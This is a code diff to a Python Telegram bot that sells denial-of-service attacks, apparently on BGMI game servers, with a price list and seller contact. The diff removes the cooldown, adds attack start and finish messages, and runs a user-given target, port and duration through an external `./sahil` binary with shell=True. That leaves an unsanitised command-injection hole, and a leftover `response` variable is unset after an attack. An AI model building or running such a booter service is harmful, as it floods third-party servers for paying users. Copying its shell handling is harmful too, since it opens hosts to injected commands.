@@ -215,36 +215,43 @@ COOLDOWN_TIME =0
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
-        # Check if the user is in admin_id (admins have no cooldown)
-        if user_id not in admin_id:
-            # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
-                response = "You Are On Cooldown . Please Wait 5min Before Running The /bgmi Command Again."
-                bot.reply_to(message, response)
-                return
-            # Update the last time the user ran the command
-            bgmi_cooldown[user_id] = datetime.datetime.now()
-        
         command = message.text.split()
-        if len(command) == 4:  # Updateokd to accept target, time, and port
+        if len(command) == 4:
             target = command[1]
-            port = int(command[2])  # Convert time to integer
-            time = int(command[3])  # Convert port to integer
-            if time > 241:
-                response = "Error: Time interval must be less than 241."
+            port = int(command[2])
+            time = int(command[3])
+            if time > 181:
+                response = "🚨 **Error:** Time must be less than 181 seconds."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
+                
+                # Stylish attack start message
+                bot.reply_to(message, f"🔥 **ATTACK STARTED!** 🔥\n\n"
+                                      f"🎯 **Target:** `{target}`\n"
+                                      f"🚀 **Port:** `{port}`\n"
+                                      f"⏳ **Duration:** `{time} seconds`\n"
+                                      f"🛠️ **Method:** `VIP USER OF @YourBot`", 
+                                      parse_mode="Markdown")
+
                 full_command = f"./sahil {target} {port} {time}"
                 subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} time: {time}"
-        else:
-            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
-    else:
-        response = " You Are Not Authorized To Use This Command ."
 
+                # Stylish attack completion message
+                bot.reply_to(message, f"✅ **ATTACK FINISHED!** ✅\n\n"
+                                      f"🎯 **Target:** `{target}`\n"
+                                      f"🚀 **Port:** `{port}`\n"
+                                      f"⏳ **Duration:** `{time} seconds`\n"
+                                      f"🛠️ **Method:** `VIP USER OF @YourBot`\n\n"
+                                      f"💪 *Mission Accomplished!* 🎯", 
+                                      parse_mode="Markdown")
+        else:
+            response = "✅Usage:- /bgmi <target> <port> <time>"
+    else:
+        response = "🚫 You are **not authorized** to use this command."
+    
     bot.reply_to(message, response)
+
 
 
 
@@ -323,6 +330,7 @@ Pr-ice List💸 :
 Day-->100 Rs
 Week-->400 Rs
 Month-->800 Rs
+contact -@SLAYER_OP7
 '''
     bot.reply_to(message, response)
 
